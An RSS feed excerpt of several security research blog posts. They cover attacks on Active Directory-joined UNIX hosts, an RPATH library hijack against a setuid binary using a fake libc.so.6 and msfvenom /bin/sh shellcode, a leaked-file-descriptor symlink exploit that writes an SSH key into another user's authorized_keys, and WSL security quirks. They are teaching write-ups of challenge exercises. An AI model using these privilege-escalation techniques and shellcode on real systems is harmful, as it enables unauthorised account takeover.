				<content:encoded><![CDATA[<p>By way of an introduction to <a href="https://www.blackhat.com/eu-18/briefings/schedule/index.html#where-2-worlds-collide-bringing-mimikatz-et-al-to-unix-12962" title="our talk">our talk</a> at Black Hat Europe, <a href="https://www.cisco.com/c/en/us/products/security/advisory-services.html" title="Security Advisory EMEAR">Security Advisory EMEAR</a> would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests.<span id="more-6805"></span></p>
<h2>Background to Active Directory integration solutions</h2>
<p>Having seen an uptick in unique UNIX infrastructures that are integrated into customers&#8217; existing Active Directory forests, the question becomes, &#8220;Does this present any concerns that may not be well understood?&#8221; This quickly became &#8220;What if an adversary could get into a UNIX box and then breach your domain?&#8221;<br />
Within a typical Active Directory integration solution (in this case <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/5.7_release_notes/sssd" title="SSSD">SSSD</a>), the solution shares a striking similarity to what a user might see on Windows. Notably, you have:</p>
<ul>
<li>DNS &#8211; Used for name resolution</li>
<li>LDAP &#8211; Used for &#8220;one-time identification&#8221; and assertion of identity</li>
<li>Kerberos &#8211; Used for ongoing authentication</li>
<li>SSSD &#8211; Like LSASS</li>
<li>PAM &#8211; Like msgina.dll or the more modern credential providers</li>
</ul>
<p>You can see a breakdown of this process <a title="here" href="https://rhelblog.redhat.com/2015/02/04/overview-of-direct-integration-options/">here</a>. Unlike Windows, there is no Group Policy for the most part (with some exceptions), so policies for sudo et al. are typically pushed as flat files to hosts.</p>
<h2>Our research</h2>
<p>Realistically, the threat models associated with each part of the implementation should be quite familiar to anyone securing a heterogeneous Windows network. Having worked with a variety of customers, it becomes apparent that the typical UNIX administrator who does not have a strong background in Windows and Active Directory will be ill-equipped to handle this threat. While we&#8217;ve been talking about successful attacks against components such as LSASS and Kerberos for quite some time, Mimikatz dates back to at least April 2014, and dumping hashes has been around even longer. Pwdump, which dumped local Windows hashes, was published by Jeremy Allison in 1997). However, no one has really taken a concerted look at whether these attacks are possible on UNIX infrastructure, nor how a blue team might spot an adversary performing them.</p>
<p>As a result of this research, we were able to develop tactics, tools, and procedures that might further assist an attacker in breaching an enterprise, and we began documenting and developing appropriate strategies to allow blue teams to appropriately detect and respond to such incursions. The Black Hat EU slides can be found <a title="here" href="/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">here</a> and whilst the tools we developed can be found on <a href="https://github.com/portcullislabs/linikatz" title="our GitHub repo">our GitHub repo</a>.</p>

				<content:encoded><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018).<span id="more-6806"></span></p>
<p>Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may not be as well understood by a typical UNIX admin who does not have a strong background in Windows and AD. Over the last few months we&#8217;ve spent some time looking a number of specific Active Directory integration solutions (both open and closed source) for UNIX systems and documenting some of the tools, tactics and procedures that enable attacks on the forest to be staged from UNIX.</p>
<p>This talk describes the technical details regarding our findings. It includes Proof of Concepts (PoC) showing real-world attacks against AD joined UNIX systems. Finally, potential solutions or mitigation controls are discussed that will help to either prevent those attacks or at the very least to detect them when they occur.</p>

<h2>A hacker challenge gone wrong</h2>
<p>A long time ago, I set my team challenge of identifying an <a title="Breaking the Links: Exploiting the Linker" href="/presentations/breaking-the-links-exploiting-the-linker/">RPATH vulnerability</a> and (if possible) exploiting the vulnerability to run some code of their choosing with higher privileges. I named my program arp-ath &#8211; lest people wasted too much time looking for other attack vectors:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cat arp-ath.c
#include &lt;stdio.h&gt;
int main(void) {
 printf(&quot;Hello world\n&quot;);
}
$ gcc -Wl,-rpath,. -o arp-ath arp-ath.c
# chmod 4755 arp-ath
</pre>
<p>The program behaves as you&#8217;d expect and is linked to libc.so.6 as you&#8217;d expect:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ ./arp-ath
Hello world
$ ldd arp-ath
 linux-vdso.so.1 =&gt; (0x00007fff0a3fd000)
 libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb6dc0d6000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fb6dc489000)
</pre>
<p>The vulnerability lies in the fact the program seaches the current directory for its libraries:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ readelf -a arp-ath | grep -i path
0x000000000000000f (RPATH) Library rpath: [.]
</pre>
<p>(You&#8217;ll sometimes see RUNPATH instead of RPATH, but both work). Check it&#8217;s vulnerable like this:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ touch libc.so.6
$ ./arp-ath
./arp-ath: error while loading shared libraries: ./libc.so.6: file too short
</pre>
<p>This challenge is very similar to Level 15 of the <a title="Nebula Challenge" href="https://exploit-exercises.com/nebula/">Nebula challenge</a> if you want to play along using that &#8211; though it&#8217;s 32-bit.</p>
<p>The team found the &#8220;arp-ath&#8221; vulnerability pretty quickly and replied to let me know. Which you&#8217;d expect as it is their job to find such vulnerabilities on client systems during Build Reviews.</p>
<p>What I hadn&#8217;t personally anticipated is what a pain it is to create a malicious modified version of libc.so.6 on 64-bit Linux. So rather than face the embarrassment of having posted a challenge that I didn&#8217;t actually have a full solution for, I cobbled together the shellcode-based solution outlined above. First let&#8217;s have a look at the difficulties I had in creating my own libc.so.6.</p>
<h2>Problems compiling a replacement libc.so.6 on 64-bit Linux</h2>
<p>I lost my original notes of what I&#8217;d tried, but I&#8217;m pretty sure that I and my colleagues followed a similar path to this <a title="Nebula Level 15 Solution" href="http://www.pwntester.com/blog/2013/11/26/nebula-level15-write-up/">solution to the Nebula level 15 challenge</a> - which has a really nice writeup of how to debug shared libraries that don&#8217;t want to work.</p>
<p>Here&#8217;s an initial attempt, which should cause a shell to spawn when the library is loaded (note I could also have replaced the &#8220;puts&#8221; function).</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cat exploit1.c
#include &lt;stdlib.h&gt;
int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
 system(&quot;/bin/sh&quot;);
}
$ gcc -fPIC -shared -o libc.so.6 exploit1.c
$ ldd ./arp-ath
./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
linux-vdso.so.1 (0x00007ffeea77d000)
libc.so.6 =&gt; ./libc.so.6 (0x00007f50430f9000)
$ ./arp-ath
./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
./arp-ath: relocation error: ./libc.so.6: symbol __cxa_finalize, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
</pre>
<p>So, let&#8217;s address those errors about lack of version numbers and failure to export __cxa_finalize (after much googling)&#8230;</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cat version
GLIBC_2.2.5{};
$ cat exploit2.c
#include &lt;stdlib.h&gt;

void __cxa_finalize (void *d) {
 return;
}

int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
 system(&quot;/bin/sh&quot;);
}
$ gcc -fPIC -shared -Wl,--version-script=version -o libc.so.6 exploit2.c
$ ./arp-ath
./arp-ath: relocation error: ./libc.so.6: symbol system, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
</pre>
<p>Hmm. More errors.</p>
<p>Cutting short a very long sequence of trial and error, when we eventually try to replicate the solution to the Nubula level 15 challenge on 64-bit, we find that it only seems to work for 32-bit:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 exploit2.c
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(system.o): relocation R_X86_64_32 against `.bss' can not be used when making a shared object; recompile with -fPIC
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sysdep.o): relocation R_X86_64_TPOFF32 against symbol `errno' can not be used when making a shared object; recompile with -fPIC
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sigaction.o): relocation R_X86_64_32S against `.text' can not be used when making a shared object; recompile with -fPIC
/usr/bin/ld: final link failed: Nonrepresentable section on output
collect2: error: ld returned 1 exit status
</pre>
<p>If I understood my googling correctly, I need a version of libc that&#8217;s been compiled with -fPIC, but that&#8217;s not possible for some reason I didn&#8217;t understand.</p>
<p>I did consider grabbing the source for libc and recompiling it after a modification, but decided life was too short. I had a better (or at least quicker) idea&#8230;</p>
<h2>So just use metasploit, then?</h2>
<p>I had a quick go at generating a shared object file with msfvenom:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
msfvenom -a x64 -f elf-so -p linux/x64/exec CMD=/bin/sh AppendExit=true &gt; libc.so.6
$ ./arp-ath
./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
./arp-ath: symbol lookup error: ./arp-ath: undefined symbol: __libc_start_main, version GLIBC_2.2.5
</pre>
<p>This was awfully familiar. I didn&#8217;t grapple much more with msfvenom after this.</p>
<h2>Patching shellcode into a copy of libc.so.6</h2>
<p>I figured I could open up a copy of libc.so.6 in a hex editor and paste in some shellcode over the top of __libc_start_main function. No matter how horribly I corrupted the file or how badly it crashed after it executed my shellcode, at least I&#8217;d have my shell.</p>
<p>I grabbed some shellcode off the internet &#8211; but equally could have generated in it Metasploit like this (I also appended a call to exit to stop the inevitable crash I mentioned):</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ msfvenom -a x64 -f hex -p linux/x64/exec CMD=/bin/sh AppendExit=true
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 55 bytes
Final size of hex file: 110 bytes
6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e8080000002f62696e2f73680056574889e60f054831ff6a3c580f05
</pre>
<p>Then I made a copy of libc.so.6 and located the file offset for the __libc_start_main function:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cp /lib/x86_64-linux-gnu/libc.so.6 .
$ objdump -FD libc.so.6 | grep _main
00000000000201f0 &lt;__libc_start_main@@GLIBC_2.2.5&gt; (File Offset: 0x201f0):
...
</pre>
<p>Using a hexeditor I pasted in the shellcode.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">&lt;/span&gt;
&lt;pre&gt;$ hexedit libc.so.6
</pre>

<h2>And this works on AIX too?</h2>
<p>I tried to get this working on AIX &#8211; which typically doesn&#8217;t have a C compiler available; AND typically has loads of RPATH vulnerabilities. However, the shellcode I tried was self-modifying. This is fine when you&#8217;re injecting shellcode as data, but the code section I was injecting into was read-only. So I got a segfault. I&#8217;ll follow up if get this working.</p>
<h2>Conclusion</h2>
<p>The quick and dirty solution, while inevitably unsatisfactory is sometimes sufficient. Especially given the lack of tools, source, time you might have when exploiting this sort of vulnerabilities. Maybe it&#8217;s not a terrible solution. You be the judge.</p>

				<content:encoded><![CDATA[<p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is what we&#8217;ll look at in the context of setUID programs on Linux.<span id="more-6538"></span></p>
<p>I was reminded of this technique as I tackled an <a href="https://exploit-exercises.com/nebula/level11/">old hacker challenge</a> recently. This a fun challenge. And there&#8217;s a much easier solution than using the technique I&#8217;m going to cover here. Maybe try both the hard way and the easy way.</p>
<h2>Example program</h2>
<p>Here&#8217;s a fairly minimal test case of example code &#8211; inspired by the nebula challenge code.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv)
{
 char *cmd = argv[1];
 char tmpfilepath[] = &quot;/tmp/tmpfile&quot;;  // Modern systems need &quot;sysctl fs.protected_symlinks=0&quot; or &quot;chmod 0777 /tmp&quot; for this to be vulnerable to the symlink attack we'll use later.
 char data[] = &quot;pointless data\n&quot;;

int fd = open(tmpfilepath, O_CREAT|O_RDWR, 0600);
 unlink(tmpfilepath);
 write(fd, data, strlen(data));
 setuid(getuid());
 system(cmd);
}
</pre>
<p>Let&#8217;s start by compiling this and setting the setUID bit so we have an example to work with:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
root@challenge:/# useradd -m tom # victim/target user
root@challenge:/# useradd -m bob # attacker
root@challenge:/# cd ~bob
root@challenge:/home/bob# cp /share/fd-leak.c .
root@challenge:/home/bob# gcc -o fd-leak fd-leak.c
root@challenge:/home/bob# chown tom:tom fd-leak
root@challenge:/home/bob# chmod 4755 fd-leak
root@challenge:/home/bob# ls -l fd-leak
-rwsr-xr-x 1 root root 8624 Apr 12 11:06 fd-leak
root@challenge:/home/bob# su - bob
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
</pre>
<p>For exploitation later, we&#8217;ll also need the target user (tom in this case) to have a .ssh directory in their home directory:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
root@challenge:/# mkdir ~tom/.ssh; chown tom:tom ~tom/.ssh
</pre>
<p>What this program lacks in realism is hopefully made up for in its simplicity.</p>
<h2>Normal operation</h2>
<p>As can be seen from the code above, the program should:</p>
<ol>
<li>Create the file /tmp/tmpfile, then delete it. A file descriptor is retained</li>
<li>Drop privileges. This is poor code for dropping privileges, btw. It suffices for this example, though</li>
<li>Run a command that is supplied as an argument. It should run as the invoking user, not as the target user (tom)</li>
</ol>
<p>Let&#8217;s try it out (note that I modify .bashrc to make it clearer to the reader when a subshell has been spawned):</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
root@challenge:/home/bob# su - bob
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ echo 'echo subshell...' &gt; .bashrc
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ ./fd-leak bash -p
subshell...
bob@challenge:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
root@challenge:/home/bob# useradd -m tom
root@challenge:/home/bob# su - tom
$ mkdir .ssh
$ ls -la
total 28
drwxr-xr-x 3 tom tom 4096 Apr 12 11:42 .
drwxr-xr-x 2 tom tom 4096 Apr 12 11:42 .ssh
...
</pre>
<p>So, yes fd-leak appears to drop privileges. (Our spawned shell isn&#8217;t responsible for the drop in privileges as I&#8217;ve hopefully illustrated by passing -p to bash above and by running id directly).</p>
<p>Finally, we expect the child process to inherit a file handle to the now deleted file /tmp/tmpfile:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ls -l /proc/self/fd
total 0
lrwx------ 1 bob bob 64 Apr 12 11:22 0 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 1 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 2 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 3 -&gt; '/tmp/tmpfile (deleted)'
lr-x------ 1 bob bob 64 Apr 12 11:22 4 -&gt; /proc/53982/fd
</pre>
<p>It does. We&#8217;re all set.</p>
<h2>High level exploit path</h2>
<p>Our approach to attacking this vulnerable program will follow these high level steps which are covered in more detail in the sections below:</p>
<ol>
<li>Create a symlink that the vulnerable code will try to write to. This way we can create a file in a location of our choosing and with a name we choose. We&#8217;ll choose ~tom/.ssh/authorized_keys</li>
<li>We&#8217;ll run some code in the context of a child process to manipulate the open file handle so we can write the contents of authorized_keys file</li>
<li>Finally, we log with via SSH</li>
</ol>
<h2>Practical exploitation</h2>
<h3>Step 1: Symlink attack</h3>
<p>Simple:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
</pre>
<p>This step was harder in the nebula challenge, but I didn&#8217;t want to cloud the issue.</p>
<p>If we run the code now, we see that the authorized_keys file is created, but we don&#8217;t control the contents.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
ln: failed to create symbolic link '/tmp/tmpfile': File exists
bob@challenge:~$ ls -l /tmp/tmpfile
lrwxrwxrwx 1 bob bob 30 Apr 12 12:11 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
</pre>
<p>We also don&#8217;t control the permissions the file gets created with. (Feel free to try the above on authorized_keys2 after running &#8220;umask 0&#8243; to check).</p>
<h3>Step 2: Running code in child process</h3>
<p>It&#8217;s pretty easy to run code because of the nature of the program. Again, this was harder in the nebula challenge. We can see the file handle we want listed in /proc/self/fd. It&#8217;s file descriptor 3:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile

bob@challenge:~$ ls -l /tmp/tmpfile
lrwxrwxrwx 1 bob bob 30 Apr 12 12:25 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
bob@challenge:~$ ./fd-leak bash
subshell...
bob@challenge:~$ ls -l /proc/self/fd
total 0
lrwx------ 1 bob bob 64 Apr 12 12:26 0 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 1 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 2 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 3 -&gt; /home/tom/.ssh/authorized_keys
lr-x------ 1 bob bob 64 Apr 12 12:26 4 -&gt; /proc/54947/fd
</pre>
<p>So we can just &#8220;echo key &gt; /proc/self/fd/3&#8243;? Not really. That&#8217;s just a symlink. A symlink to a file that doesn&#8217;t exist to be precise. And it&#8217;s pointing to a location that we&#8217;d don&#8217;t have privileges to create. Let&#8217;s confirm that:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ls -l /home/tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:25 /home/tom/.ssh/authorized_keys
bob@challenge:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ echo &gt; /home/tom/.ssh/authorized_keys
bash: /home/tom/.ssh/authorized_keys: Permission denied
bob@challenge:~$ echo &gt; /tmp/tmpfile
bash: /tmp/tmpfile: Permission denied
bob@challenge:~$ echo &gt; /proc/self/fd/3
bash: /proc/self/fd/3: Permission denied
</pre>
<p>We need to write to file descriptor 3&#8230; So is there are version of cat that works with file descriptors? Not that I know of. Let&#8217;s write some small utilities that will help us get to grips with accessing inherited file handles. We&#8217;ll write 3 tools:</p>
<ul>
<li>read &#8211; that uses the read function to read a set number of bytes from a particular file descriptor</li>
<li>write &#8211; that writes a string of our choosing to a particular file descriptor</li>
<li>lseek &#8211; that lets us position our read/write</li>
</ul>
<p>Here&#8217;s the source and compilation of the (very crude) demo tools:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ cat read.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
 char buf[1024];
 memset(buf, 0, 1024);
 int r = read(atoi(argv[1]), buf, 10);
 printf(&quot;Read %d bytes\n&quot;, r);
 write(1, buf, 10);
}

bob@challenge:~$ gcc -o read read.c
bob@challenge:~$ cat write.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
 printf(&quot;writing %s to fd %s\n&quot;, argv[2], argv[1]);
 write(atoi(argv[1]), argv[2], strlen(argv[2]));
}
bob@challenge:~$ gcc -o write write.c
bob@challenge:~$ cat lseek.c
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
 printf(&quot;seek to position %s on fd %s\n&quot;, argv[2], argv[1]);
 lseek(atoi(argv[1]), atoi(argv[2]), SEEK_SET);
}

bob@challenge:~$ gcc -o lseek lseek.c
</pre>
<p>Let&#8217;s see the tools in action. First we try to read, then write to file descriptor 3, but the read always returns 0 bytes:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ./read 3
Read 0 bytes
bob@challenge:~$ ./write 3 hello
writing hello to fd 3
bob@challenge:~$ ./read 3
Read 0 bytes
</pre>
<p>The reason is that we need to seek to a location in the file that isn&#8217;t the end of the file. Let&#8217;s seek to position 0, the beginning of the file:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ./lseek 3 0
seek to position 0 on fd 3
bob@challenge:~$ ./read 3
Read 10 bytes
pointless bob@challenge:~$ ./read 3
Read 10 bytes
data
hellobob@challenge:~$ ./read 3
Read 0 bytes
</pre>
<p>Much better.</p>
<p>Finally we need exploit the program above. We have two choices:</p>
<ul>
<li>Run a shell as before, then use our new tool to write the key to authorized_keys; or</li>
<li>Make a new tool using the functions shown above to write to authorized_keys.</li>
</ul>
<p>Let&#8217;s do the former. The latter is an exercise for the reader. Note that we need to seek to position 0 before we write our data. It&#8217;s important to overwrite the &#8220;pointless&#8221; message already there as that corrupts the authorized_keys file:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/bob/.ssh/id_rsa): bobkey
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in bobkey.
Your public key has been saved in bobkey.pub.
bob@challenge:~$ cat bobkey.pub

<h3>Step 3: Logging in via SSH</h3>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@challenge:~$ ssh -i bobkey tom@localhost
$ id
uid=1002(tom) gid=1002(tom) groups=1002(tom)
</pre>
<p>We&#8217;re done. We exploited the leaked file descriptor to write data of our choosing to tom&#8217;s authorized_keys file. We used a slightly unrealistic symlink attack along the way, but that doesn&#8217;t invalidate our discussion of how to use and abuse leaked file descriptors.</p>
<h2>Conclusion</h2>
<p>Hacker challenges are fun. Even when you accidentally find a much harder solution and waste 10 times longer than necessary.</p>
<p>Writing secure setUID programs can be difficult. Particularly if you spawn child processes; particularly if you use open() in directories writable by other users. fs.protected_symlinks provides some mitigation for directories with the sticky bit set.</p>

				<content:encoded><![CDATA[<p>Whilst there has been quite a lot of analysis of Microsoft&#8217;s new <a title="Windows Subsystem for Linux" href="https://msdn.microsoft.com/en-gb/commandline/wsl/about">Windows Subsystem for Linux</a> (aka WSL or Bash on Ubuntu on Windows) and how it functions (particularly from <a title="Alex Ionescu" href="https://github.com/ionescu007/lxss">Alex Ionescu</a>), most of this has focused on how it affects the Windows security model. Being a keen UNIX focused researcher, I decided to take it for a spin.<span id="more-5869"></span></p>
<p>The first thing I did once I had it installed was look at how the Windows process tree had changed. Running it results in two new branches to your process tree. The first contains the Windows bash.exe instance which hosts your new terminal:</p>
<ul>
<li>explorer.exe (runs as your user):
<ul>
<li>bash.exe (runs as your user):
<ul>
<li>conhost.exe (runs as your user)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Whilst the second contains the Linux process tree:</p>
<ul>
<li>svchost.exe (runs as SYSTEM):
<ul>
<li>init (runs as your user, no disabled privileges, locked into a job):
<ul>
<li>bash (runs as your user, disabled privileges, locked into a job, break away set to true)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>As you might expect, new code compiled to support this is well hardened and uses Windows 10&#8242;s advanced mitigations. Specifically, bash.exe has the following mitigations enabled:</p>
<ul>
<li>DEP enabled</li>
<li>ASLR high entropy, bottom up</li>
<li>CFG enabled</li>
</ul>
<p>Digging a little further, the same can&#8217;t be said for init, bash and other parts of the Linux process tree. Whilst DEP is enabled, ASLR and CFG are not. In fairness, this shouldn&#8217;t come as any great surprise &#8211; they&#8217;re Ubuntu packaged binaries however it does start to show show how introducing WSL to your system can change the systems posture.</p>
<h2>The kernel</h2>
<p>So what does the &#8220;kernel&#8221; version look like. Well, at the point I examined it:</p>

<p>This version of the Linux kernel should be vulnerable to <a title="dirty cow" href="https://dirtycow.ninja/">dirty cow</a>, so what of it? It doesn&#8217;t work which again isn&#8217;t a huge surprise. As Alex has alluded to there is a quite a substantial amount of mapping going on to implement the Linux system calls on Windows and whilst they should be API compatible, the implementations between a real Linux kernel and what WSL gives up may be quite different.</p>
<p>This does however bring up the first critical point: There is no relationship between the patches supplied as part of Windows Update and what goes on with WSL. If you don&#8217;t patch regularly you&#8217;ll still be vulnerable to a whole plethora of Ubuntu (userland) vulnerabilities.</p>
<h2>Memory corruption mitigations</h2>
<p>Some Linux mitigations are in play however (as they would be on any real Ubuntu system) as can be seen with <a title="checksec.sh" href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a>:</p>
<ul>
<li>System-wide ASLR (kernel.randomize_va_space): On (Setting: 2)</li>
<li>Does the CPU support NX: Yes</li>
</ul>
<p>And of course binaries are compiled with whatever <a title="Ubuntu hardening" href="https://wiki.ubuntu.com/Security/Features">Ubuntu hardening</a> is currently supported:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
	COMMAND    PID RELRO             STACK CANARY           NX/PaX        PIE
	  init      1 Full RELRO        Canary found           NX enabled    Dynamic Shared Object
	  sudo     14 Partial RELRO     Canary found           NX enabled    Dynamic Shared Object
	    su     15 Partial RELRO     Canary found           NX enabled    No PIE
	  bash     16 Partial RELRO     Canary found           NX enabled    No PIE
	  bash      2 Partial RELRO     Canary found           NX enabled    No PIE
</pre>
<h2>Shared memory</h2>
<p>So what does WSL look like more generally. Well, since I&#8217;ve had some fun with <a title="shared memory" href="https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/">shared memory</a>, I wondered how this was implemented. Well, it turns out that it&#8217;s not:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
root@DESKTOP-L4857K3:~# ipcs

kernel not configured for shared memory

kernel not configured for semaphores

kernel not configured for message queues
</pre>
<p>Whether this will have any security implications, it&#8217;s difficult to say but at the very least it may stop certain applications from working. Other applications may revert to using other less well tested IPC mechanisms which may expose security issues along the way.</p>
<h2>Debugging</h2>
<p>Moving on, how about debugging something. A simple tool which exercises the ptrace() system call is strace. Here&#8217;s what happens when strace is run on a normal process:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
root@DESKTOP-L4857K3:/sys# strace -f printf &quot;test&quot; 2&gt;&amp;1 | head -n 5
execve(&quot;/usr/bin/printf&quot;, [&quot;printf&quot;, &quot;test&quot;], [/* 15 vars */]) = 0
brk(0)                                  = 0xa9d000
...
</pre>
<p>However you can&#8217;t strace PID 1 (as would have been possible on real Linux), instead ptrace() returns an error: &#8220;Operation not permitted&#8221;.</p>
<h2>File systems</h2>
<p>Whilst /mnt doesn&#8217;t show up as a different file system, /mnt/c is actually used to map the underlying Windows system disk. This is immediately peculiar since it is mapped with permissions of 0777 (world readable, world writable amongst others). Moreover any files created under it are created with an owner of root. You&#8217;d think this might be a problem but from what I&#8217;ve seen so far, assuming the Windows file permissions are set right then (because everything (even setUID processes) runs as you from Windows&#8217; perspective) you won&#8217;t be able to access anything inappropriate (think SAM etc). It. Just. Looks. Weird.</p>
<p>Furthermore, the way that WSL implements umasks too is an oddity. umask doesn&#8217;t work on all file system types and in particular the aforementioned /mnt/c. Observe the following:</p>
<pre class="brush: plain; gutter: false; title: ; notranslate">
root@DESKTOP-L4857K3:/# umask 666
root@DESKTOP-L4857K3:/# touch foo
root@DESKTOP-L4857K3:/# ls -la foo
---------- 1 root root 0 Mar 28 23:10 foo
root@DESKTOP-L4857K3:~# rm foo
root@DESKTOP-L4857K3:~# cd /mnt/c/Users/x/
root@DESKTOP-L4857K3:/mnt/c/Users/x# touch foo
root@DESKTOP-L4857K3:/mnt/c/Users/x# ls -la foo
-rwxrwxrwx 1 root root 0 Mar 28 23:10 foo
</pre>
<p>Umask is honoured in the first location but not the second (a umask of 0666 should mean that files are created with no permissions). Whilst there&#8217;s a fundamental Windows reason why this is the case, there is nothing to indicate this to the Ubuntu instance&#8217;s userland and thus files created within your home directory might be created with undesirable permissions. Microsoft are tracking this in the GitHub as <a title="issue 352" href="https://github.com/Microsoft/BashOnWindows/issues/352">issue 352</a>.</p>
<h2>Authentication</h2>
<p>Unlike on a real Ununtu there&#8217;s no terminal level authentication (whilst user accounts within the Ubuntu instance do have passwords, they&#8217;re not needed unless you want to access the system remotely or gain root privileges via sudo). Moreover, from Windows&#8217; perspective there is no difference between UID 0 and UID 1000. You can start a terminal and then use sudo to elevate your privileges and Windows will be none the wiser (Linux capabilities aren&#8217;t mapped into Windows user rights or special tokens). That might mean that users won&#8217;t care too much about their Ubuntu instance&#8217;s passwords but as you can imagine with no password policy enforcement, users might be tempted to reuse their Windows passwords.</p>
